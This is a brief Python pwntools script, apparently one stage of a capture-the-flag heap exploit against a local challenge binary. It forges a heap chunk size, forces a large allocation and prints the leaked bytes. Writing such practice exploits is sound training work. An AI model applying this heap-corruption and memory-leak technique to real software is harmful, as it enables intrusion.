import os, sys
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
HERE = '/mnt/d/ctf-index/_z_441'
io = process(os.path.join(HERE, 'hft'))

def alloc(size, data=b''):
    io.recvuntil(b"PKT_RES")
    io.send(p64(size))
    io.send(bytes(data) + b"\n")

alloc(0x10, b"\x00"*8)
alloc(0x10, p64(0) + p64(0) + p64(0xd31))
alloc(0x1000, b"\x00"*8)
alloc(0x8, p64(1))
io.recvuntil(b"PKT_DATA\x1b[m:[")
buf = io.recvuntil(b"\x1b[1;34mPKT_INFO", drop=True)
print("ECHO RAW:", buf.hex(), repr(buf))
io.close()
